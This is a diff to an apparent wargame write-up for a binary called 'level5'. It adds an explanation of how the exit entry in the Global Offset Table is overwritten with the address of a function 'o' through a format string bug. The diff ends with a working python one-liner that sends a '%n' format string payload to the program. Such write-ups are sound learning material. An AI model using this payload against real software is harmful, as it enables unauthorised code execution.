@@ -94,9 +94,13 @@ Search the position of our buffer
 
 4th position
 
-After the printf, there is a exit call. We can use it for overwrite it's address with the address of "o"
+After the printf, there is an exit call. We can't rewrite EIP, the program will exit before
 
-Get the address of exit in the GOT table
+But we can replace the address of exit in the GOT with the address of "o", for calling it instead of exit
+
+The GOT (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses
+
+Get the address of exit in the GOT
 
 	(gdb-peda)$ info function exit
 	All functions matching regular expression "exit":
@@ -136,3 +140,5 @@ We need the number of bytes to write for the "%n" modifier
 Let's go
 
 	(python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"' ; cat -) | ./level5
+
+Script it for reproduice!
